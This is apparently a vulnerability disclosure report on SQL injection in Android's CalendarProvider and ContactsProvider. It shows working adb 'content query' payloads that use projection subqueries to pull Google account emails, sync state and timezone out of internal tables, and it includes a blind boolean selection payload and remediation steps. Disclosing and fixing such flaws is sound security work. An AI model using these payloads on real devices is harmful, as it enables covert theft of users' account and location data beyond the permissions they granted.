# VRP Report #27: CalendarProvider SQL Injection Enables Internal Table Access — Google Account Email and Sync State Extraction

## Summary

A SQL injection vulnerability in Android's CalendarProvider allows an app with only `READ_CALENDAR` permission to extract data from **internal database tables** not exposed through the normal content provider API. This includes the user's Google account email address, calendar sync state with timestamps, device timezone, and full database schema — data that `READ_CALENDAR` was never designed to grant access to.

## Severity: High

- **Confidentiality Impact**: Extraction of Google account email (PII), sync timing, subscribed calendars, device timezone (location inference)
- **Privilege Escalation**: `READ_CALENDAR` → full database access including 15 internal tables
- **Root Cause**: `ENFORCE_STRICT_QUERY_BUILDER` (Android bug 143231523) is globally disabled on Android 17 (API 37)

## Affected Component

- **Provider**: `com.android.providers.calendar.CalendarProvider2`
- **URI**: `content://com.android.calendar/events` (and all CalendarProvider URIs)
- **Parameter**: `projection[]` (no input sanitization)
- **Build**: CP2A.260605.012, Android 17 (API 37), Pixel 6a

## Vulnerability Details

The CalendarProvider accepts arbitrary SQL subqueries in the `projection` parameter. An attacker app can inject:

```
projection = "(SELECT ... FROM internal_table) AS x"
```

This executes as part of the SQL SELECT statement, allowing direct extraction of data from ANY table in the calendar database — including tables that are never exposed through the CalendarProvider API (e.g., `_sync_state`, `CalendarCache`, `_sync_state_metadata`).

### Root Cause

Android's `SQLiteQueryBuilder` has a flag `ENFORCE_STRICT_QUERY_BUILDER` (tracked as Android bug 143231523) that, when enabled, validates projection columns to prevent SQL injection. On this Android 17 build, this flag is **globally disabled**, allowing arbitrary SQL in projection parameters.

## Proof of Concept — Dynamic Execution on Pixel 6a

### Step 1: Enumerate All Tables (15 tables found)

```
content query --uri content://com.android.calendar/events \
  --projection "'(SELECT group_concat(name,char(10)) FROM sqlite_master WHERE type=\"table\") AS x'"
```

**Result (proven on device):**
```
android_metadata, _sync_state, _sync_state_metadata, Colors, Calendars,
Events, sqlite_sequence, EventsRawTimes, Instances, CalendarMetaData,
CalendarCache, Attendees, Reminders, CalendarAlerts, ExtendedProperties
```

### Step 2: Extract Google Account Email from _sync_state

```
content query --uri content://com.android.calendar/events \
  --projection "'(SELECT group_concat(account_name) FROM _sync_state) AS x'"
```

**Result**: `sandiyotest@gmail.com`

### Step 3: Extract Full Sync State JSON

```
content query --uri content://com.android.calendar/events \
  --projection "'(SELECT hex(data) FROM _sync_state LIMIT 1) AS x'"
```

**Decoded JSON**:
```json
{
  "version": 16,
  "firstSeen": false,
  "jellyBeanOrNewer": true,
  "b38085245": 2147483647,
  "package": "com.google.android.calendar",
  "sandiyotest@gmail.com": {},
  "en-gb.indian#holiday@group.v.calendar.google.com": {
    "window_end": 1822176000000,
    "feed_updated_time": "2026-08-21T08:38:24.703Z",
    "last_sync_time": 1788550537668,
    "do_incremental_sync": true
  },
  "en.indian#holiday@group.v.calendar.google.com": {
    "window_end": 1822176000000,
    "feed_updated_time": "2026-08-21T08:38:24.703Z",
    "last_sync_time": 1788550523713,
    "do_incremental_sync": true
  }
}
```

**Data extracted**:
- Google account email: `sandiyotest@gmail.com`
- Subscribed calendars including holiday calendar IDs
- Last sync timestamps (can infer device activity patterns)
- Sync window configuration

### Step 4: Extract Device Timezone (Location Inference)

```
content query --uri content://com.android.calendar/events \
  --projection "'(SELECT group_concat(key || \"=\" || value) FROM CalendarCache) AS x'"
```

**Result**:
```
timezoneInstances=Asia/Kolkata
timezoneDatabaseVersion=2025c
timezoneType=auto
```

The timezone `Asia/Kolkata` reveals the user is in India — location inference without any location permission.

### Step 5: Extract Calendar Account Details

```
content query --uri content://com.android.calendar/events \
  --projection "'(SELECT group_concat(account_name) FROM Calendars) AS x'"
```

**Result**: `sandiyotest@gmail.com` (repeated per calendar)

## Impact Assessment

| Data Extracted | Normal READ_CALENDAR Access | Via SQL Injection |
|---|---|---|
| Calendar events | ✓ | ✓ |
| Google account email (_sync_state) | ✗ | ✓ |
| Sync state JSON with timestamps | ✗ | ✓ |
| CalendarCache (timezone/location) | ✗ | ✓ |
| Full database schema (sqlite_master) | ✗ | ✓ |
| _sync_state_metadata | ✗ | ✓ |
| sqlite_sequence (row IDs) | ✗ | ✓ |

### Attack Scenario

1. Attacker publishes a seemingly benign calendar app on Play Store
2. User grants `READ_CALENDAR` permission (a normal permission for calendar apps)
3. The app silently extracts the user's Google account email, timezone, sync patterns, and all calendar data using SQL injection in the projection parameter
4. This data is exfiltrated to the attacker's server

The user expects `READ_CALENDAR` to allow reading their events — NOT their Google account email or sync configuration from internal database tables.

## ContactsProvider — Same Root Cause (Blind Boolean)

The ContactsProvider (contacts2.db) is also affected. While it blocks projection injection ("Non-token detected"), selection injection works:

```
WHERE '1=1 AND (SELECT count(*) FROM sqlite_master WHERE name="_sync_state")>0'
```

Confirmed accessible internal tables via blind boolean:
- `_sync_state` (contains account sync data)
- `accounts` (contains Google account information)
- `phone_lookup` (phone number lookup table)
- 30-35 total tables in the contacts database

Blind boolean extraction from ContactsProvider is slower but can extract ANY data character by character from these internal tables.

## Remediation

1. **Enable `ENFORCE_STRICT_QUERY_BUILDER`** globally — this is the tracked fix (bug 143231523)
2. Validate `projection` parameter in CalendarProvider to only allow known column names
3. Validate `selection` parameter in ContactsProvider to prevent subquery injection
4. Consider making `_sync_state` and `CalendarCache` tables inaccessible even from within the database (separate database or encrypted)

## Environment

- Device: Pixel 6a (bluejay)
- Build: CP2A.260605.012
- Android: 17 (API 37)
- ADB ID: 26131JEGR04733
- PoC app: com.vrp.poc (targetSdkVersion=35)
- Evidence: `dynamic_evidence/session3_evidence.log`

## Related Reports

- VRP Report #26: Multi-Provider Projection and Selection SQL Injection (CalendarProvider + ContactsProvider)
- VRP Report #15: CalendarProvider Debug Code PII Leak (prior session)
- Android Bug 143231523: ENFORCE_STRICT_QUERY_BUILDER

## Timeline

- 2026-09-08: Internal tables and sync state extraction discovered and dynamically proven
- 2026-09-08: Google account email extracted from _sync_state via projection injection
- 2026-09-08: ContactsProvider internal tables confirmed accessible via blind boolean
